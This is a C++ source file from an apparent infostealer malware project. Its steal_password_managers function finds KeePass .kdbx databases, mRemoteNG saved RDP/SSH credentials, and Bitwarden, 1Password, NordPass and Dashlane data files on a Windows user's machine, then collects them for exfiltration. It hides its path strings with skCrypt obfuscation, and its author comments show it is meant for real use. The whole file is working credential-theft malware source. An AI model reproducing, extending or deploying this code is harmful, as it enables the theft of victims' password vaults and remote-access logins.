#include <misc_stealing/password_managers.hpp>
#include <filesystem>
#include <string>
#include <sysinfo.hpp>
#include <exfiltration_utils/mem_store.hpp>
#include <crypto_utils/skCrypter.hpp>

namespace fs = std::filesystem;

namespace misc_exfiltration {

void steal_password_managers() {
    std::string home    = features::get_home();
    std::string roaming = home + skCrypt("\\AppData\\Roaming\\");
    std::string local   = home + skCrypt("\\AppData\\Local\\");

    //grab .kdbx (KeePass) database files and config
    {
        static const char* keepass_dirs[] = { skCrypt("KeePass"), skCrypt("KeePass2"), skCrypt("KeePassXC") };
        for (const char* d : keepass_dirs) {
            fs::path dir = fs::path(roaming) / d;
            if (fs::exists(dir)) {
                try {
                    for (const auto& e : fs::directory_iterator(dir)) {
                        if (!e.is_regular_file()) continue;
                        std::string ext = e.path().extension().string();
                        if (ext == skCrypt(".kdbx") || ext == skCrypt(".xml"))
                            mem_store::import_file(
                                skCrypt("password_managers/") + std::string(d) + "/" + e.path().filename().string(),
                                e.path());
                    }
                } catch (...) {}
            }
        }
        //also scan docs and desktop for .kdbx files
        {
            fs::path dir(home + skCrypt("\\Documents\\"));
            if (fs::exists(dir)) try {
                for (const auto& e : fs::directory_iterator(dir))
                    if (e.is_regular_file() && e.path().extension() == skCrypt(".kdbx"))
                        mem_store::import_file(skCrypt("password_managers/keepass_found/") + e.path().filename().string(), e.path());
            } catch (...) {}
        }
        {
            fs::path dir(home + skCrypt("\\Desktop\\"));
            if (fs::exists(dir)) try {
                for (const auto& e : fs::directory_iterator(dir))
                    if (e.is_regular_file() && e.path().extension() == skCrypt(".kdbx"))
                        mem_store::import_file(skCrypt("password_managers/keepass_found/") + e.path().filename().string(), e.path());
            } catch (...) {}
        }
    }

    //mremoteng confCons.xml stores RDP/SSH/telnet creds (untested, saw this on exploit.)
    {
        fs::path p1 = fs::path(roaming) / skCrypt("mRemoteNG") / skCrypt("confCons.xml");
        if (fs::exists(p1))
            mem_store::import_file(skCrypt("password_managers/mRemoteNG/confCons.xml"), p1);
        fs::path p2 = fs::path(home) / skCrypt("Documents") / skCrypt("mRemoteNG") / skCrypt("confCons.xml");
        if (fs::exists(p2))
            mem_store::import_file(skCrypt("password_managers/mRemoteNG/confCons.xml"), p2);
    }

    //bitwarden desktop
    {
        fs::path bw = fs::path(roaming) / skCrypt("Bitwarden") / skCrypt("data.json");
        if (fs::exists(bw))
            mem_store::import_file(skCrypt("password_managers/bitwarden/data.json"), bw);
    }

    //1password
    {
        fs::path op = fs::path(local) / skCrypt("1Password");
        if (fs::exists(op))
            mem_store::import_tree(skCrypt("password_managers/1password"), op, 512 * 1024);
    }

    //nordpass (todays sponsor)
    {
        fs::path np = fs::path(local) / skCrypt("NordPass");
        if (fs::exists(np))
            mem_store::import_tree(skCrypt("password_managers/nordpass"), np, 256 * 1024);
    }

    //dashlane
    {
        fs::path dl = fs::path(roaming) / skCrypt("Dashlane");
        if (fs::exists(dl))
            mem_store::import_tree(skCrypt("password_managers/dashlane"), dl, 256 * 1024);
    }
    //lastpass getting breached so much, no need to even steal DBs
}

} //namespace misc_exfiltration

//only tested keepass, donthave the rest.
